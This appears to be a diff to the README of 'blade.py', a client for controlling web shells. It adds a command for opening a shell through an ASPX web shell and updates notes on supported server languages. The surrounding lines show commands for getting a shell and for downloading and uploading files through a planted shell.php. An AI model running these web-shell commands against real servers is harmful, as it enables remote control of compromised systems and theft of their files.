@@ -28,6 +28,10 @@ Get a shell:
 
  python blade.py -u http://localhost/shell.php -s php -p cmd --shell
 
+Get a shell with longer timeout (i.e. for windows):
+
+python blade.py -u http://localhost/shell.aspx -s asp -p cmd --shell -t 60
+
 Download a file:
 
 python blade.py -u http://localhost/shell.php -s php -p cmd --pull remote_path local_path
@@ -36,8 +40,15 @@ Upload a file:
 
 python blade.py -u http://localhost/shell.php -s php -p cmd --push local_path remote_path
 ##Current issues
-Server side scripts supporting is not completed, currently only support PHP and ASP
+Server side scripts supporting is not completed, currently support PHP, ASP and ASPX
+ASPX file upload/download is still under development
 
 Database management function is not completed, so can not connect databases
+
+##TODO
+Implment JSP
+
+Fix file handling
+
 ##Future developent
 Beacuse I am busy sometimes, the progress of development may be a bit slow. If anyone intrest this project, welcome fork!
